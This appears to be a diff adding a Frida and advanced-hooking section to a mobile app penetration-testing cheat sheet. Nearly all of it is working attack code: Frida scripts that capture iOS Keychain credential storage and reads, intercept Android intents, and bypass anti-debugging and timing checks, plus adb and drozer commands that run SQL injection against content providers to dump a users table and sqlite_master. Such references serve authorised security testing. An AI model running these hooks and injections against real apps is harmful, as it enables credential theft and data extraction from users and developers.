@@ -785,3 +785,195 @@ grep -rn "checkCallingPermission\|enforcePermission" smali/ --include="*.smali" 
 codesign -d --entitlements :- Payload/App.app 2>/dev/null | plutil -p -
 # Look for: com.apple.developer.associated-domains, keychain-access-groups
 ```
+
+---
+
+## 17. Frida Advanced Hooking
+
+### Trace All Method Calls with Arguments
+
+```javascript
+// Frida: Hook all methods in a class and log arguments with return values
+Java.perform(function() {
+    var className = "com.target.app.NetworkClient";
+    var clazz = Java.use(className);
+    var methods = clazz.class.getDeclaredMethods();
+
+    methods.forEach(function(method) {
+        var methodName = method.getName();
+        var overloads = clazz[methodName].overloads;
+
+        overloads.forEach(function(overload) {
+            overload.implementation = function() {
+                var args = [];
+                for (var i = 0; i < arguments.length; i++) {
+                    args.push(JSON.stringify(arguments[i]));
+                }
+                console.log("[CALL] " + className + "." + methodName + "(" + args.join(", ") + ")");
+                var retval = this[methodName].apply(this, arguments);
+                console.log("[RETURN] " + methodName + " -> " + JSON.stringify(retval));
+                return retval;
+            };
+        });
+    });
+});
+```
+
+### APK Deobfuscation with JADX and ProGuard Mapping
+
+```bash
+# Decompile APK with JADX, applying ProGuard mapping file
+jadx app.apk -d app_decompiled --deobf --deobf-min 3 --deobf-max 64
+
+# Apply a mapping file for better readability
+jadx app.apk -d app_decompiled --deobf-use-sourcename
+
+# Extract ProGuard mapping from the APK if bundled
+unzip -o app.apk "proguard/*" -d extracted/
+find extracted/ -name "mapping.txt" -exec head -50 {} \;
+
+# Rename obfuscated classes using mapping
+python3 -c "
+import re, sys
+
+with open('mapping.txt') as f:
+    mappings = f.readlines()
+
+rename_map = {}
+for line in mappings:
+    # Format: original.ClassName -> obfuscated.a:
+    match = re.match(r'(.+?) -> (.+?):', line.strip())
+    if match:
+        rename_map[match.group(2).strip()] = match.group(1).strip()
+
+print(f'Loaded {len(rename_map)} class mappings')
+# Apply to decompiled source
+for original, obfuscated in rename_map.items():
+    print(f'{obfuscated} -> {original}')
+"
+```
+
+### iOS Keychain Analysis with Security Framework Hooks
+
+```javascript
+// Frida: Hook iOS Keychain operations to capture credential storage
+if (ObjC.available) {
+    // Hook SecItemAdd to capture credentials being stored
+    var SecItemAdd = Module.findExportByName('Security', 'SecItemAdd');
+    Interceptor.attach(SecItemAdd, {
+        onEnter: function(args) {
+            var attrs = ObjC.Object(args[0]);
+            var dict = ObjC.Object(args[0]);
+            var keys = dict.allKeys();
+            for (var i = 0; i < keys.count(); i++) {
+                var key = keys.objectAtIndex_(i).toString();
+                var value = dict.objectForKey_(keys.objectAtIndex_(i));
+                console.log("[KEYCHAIN-ADD] " + key + ": " + value);
+            }
+        }
+    });
+
+    // Hook SecItemCopyMatching to capture credential reads
+    var SecItemCopyMatching = Module.findExportByName('Security', 'SecItemCopyMatching');
+    Interceptor.attach(SecItemCopyMatching, {
+        onEnter: function(args) {
+            this.query = ObjC.Object(args[0]);
+            console.log("[KEYCHAIN-READ] Query: " + this.query.description());
+        },
+        onLeave: function(retval) {
+            if (retval.toString() === '0') {
+                console.log("[KEYCHAIN-READ] Success - credentials accessed");
+            }
+        }
+    });
+}
+```
+
+### Intent Hijacking via Frida
+
+```javascript
+// Frida: Intercept and modify Android Intent data in transit
+Java.perform(function() {
+    var Intent = Java.use("android.content.Intent");
+
+    // Hook getIntent to see what the activity received
+    var Activity = Java.use("android.app.Activity");
+    Activity.getIntent.implementation = function() {
+        var intent = this.getIntent();
+        var action = intent.getAction();
+        var data = intent.getData();
+        var extras = intent.getExtras();
+
+        console.log("[INTENT] Action: " + action);
+        console.log("[INTENT] Data: " + data);
+        if (extras) {
+            var keys = extras.keySet().iterator();
+            while (keys.hasNext()) {
+                var key = keys.next();
+                console.log("[INTENT] Extra: " + key + " = " + extras.get(key));
+            }
+        }
+        return intent;
+    };
+
+    // Hook startActivity to intercept outgoing intents
+    Activity.startActivity.overload("android.content.Intent").implementation = function(intent) {
+        console.log("[INTENT-OUT] Target: " + intent.getComponent());
+        console.log("[INTENT-OUT] Action: " + intent.getAction());
+        console.log("[INTENT-OUT] Data: " + intent.getData());
+        this.startActivity(intent);
+    };
+});
+```
+
+### Content Provider Exploitation via SQL Injection
+
+```bash
+# Test content provider for SQL injection via adb
+adb shell "content query --uri content://com.target.app.provider/items --where \"name='test' OR '1'='1'\""
+
+# Extract all data from a vulnerable content provider
+adb shell "content query --uri content://com.target.app.provider/users --where \"1=1\""
+
+# Union-based SQL injection in content provider
+adb shell "content query --uri content://com.target.app.provider/items --where \"name='' UNION SELECT 1,sql,3,4,5 FROM sqlite_master--\""
+
+# Drozer automated content provider SQL injection
+drozer console connect
+run scanner.provider.injection -a com.target.app
+run scanner.provider.traversal -a com.target.app
+run app.provider.query content://com.target.app.provider/users --projection "'"
+run app.provider.query content://com.target.app.provider/users --selection "'"
+```
+
+### Binary Protection Bypass (Anti-Debug / Anti-Tamper)
+
+```javascript
+// Frida: Bypass common anti-debugging techniques in Android native libraries
+Java.perform(function() {
+    // Bypass android.os.Debug.isDebuggerConnected()
+    var Debug = Java.use("android.os.Debug");
+    Debug.isDebuggerConnected.implementation = function() {
+        console.log("[BYPASS] Debug.isDebuggerConnected() -> false");
+        return false;
+    };
+
+    // Bypass ptrace-based anti-debug in native code
+    var ptrace = Module.findExportByName(null, "ptrace");
+    if (ptrace) {
+        Interceptor.replace(ptrace, new NativeCallback(function() {
+            console.log("[BYPASS] ptrace() called, returning 0");
+            return 0;
+        }, 'int', []));
+    }
+
+    // Bypass timing checks (System.nanoTime)
+    var startTime = Java.use("java.lang.System").nanoTime();
+    var System = Java.use("java.lang.System");
+    System.nanoTime.implementation = function() {
+        var real = this.nanoTime();
+        console.log("[BYPASS] nanoTime() -> consistent value");
+        return startTime;  // Return consistent time to defeat timing checks
+    };
+});
+```
